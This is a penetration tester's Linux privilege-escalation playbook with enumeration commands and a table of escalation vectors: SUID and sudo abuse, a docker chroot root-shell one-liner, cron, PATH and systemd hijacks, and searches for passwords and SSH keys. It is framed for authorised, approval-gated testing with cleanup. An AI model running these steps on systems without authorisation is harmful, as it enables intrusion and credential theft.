# Linux privilege-escalation playbook
# In-scope host, approval-gated, benign proof (id), always clean up. Prefer the lowest-risk vector.

## Enumerate
```
# automated
./linpeas.sh | tee enum.txt      # or LinEnum.sh, linux-exploit-suggester
pspy64                           # watch cron/processes without root
# manual quick wins
id; sudo -l; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
getcap -r / 2>/dev/null                          # capabilities
cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers
grep -rnw '/etc' -e 'password' 2>/dev/null; ls -la ~/.ssh /root/.ssh 2>/dev/null
```

## Vectors → exploitation (benign)
| Vector | Check | Exploit (benign root proof) |
|---|---|---|
| **SUID binary** | `find -perm -4000` | GTFOBins for that binary (`./gtfo -p`); e.g. SUID `bash` → `bash -p` |
| **sudo rule** | `sudo -l` | GTFOBins sudo section (NOPASSWD binaries → shell); `sudo <gtfo>` |
| **Writable cron/timer** | world-writable script in cron | add a benign root-run marker, wait, confirm, REVERT |
| **Capabilities** | `getcap -r /` | `cap_setuid` on python/perl → setuid(0) one-liner |
| **PATH hijack** | a root script calling a relative binary | place a benign binary earlier in PATH, confirm, REVERT |
| **Writable service/unit** | writable `.service`/`/etc/systemd` | edit to run a benign marker as root, REVERT |
| **Group: docker** | `id` has `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` (benign id) |
| **Group: lxd** | `id` has `lxd` | mount host via a privileged container (benign id) |
| **Group: disk** | `id` has `disk` | `debugfs /dev/sdaX` read-only proof (don't write) |
| **NFS no_root_squash** | `/etc/exports` | mount, place a SUID (lab only) — on prod, report feasibility |
| **Kernel exploit** | `uname -a` + suggester | HIGH RISK (crash) — report feasibility, run ONLY with approval in a safe window |
| **Readable creds** | configs, history, .ssh, backups | reuse found creds (`su`) |

## Proof + cleanup
Prove root with `id` (uid=0) and a benign command. Record EVERYTHING created (files, cron lines, SUID
copies, containers) in `cleanup.md` and remove it. No persistence, no destruction, no data exfil.
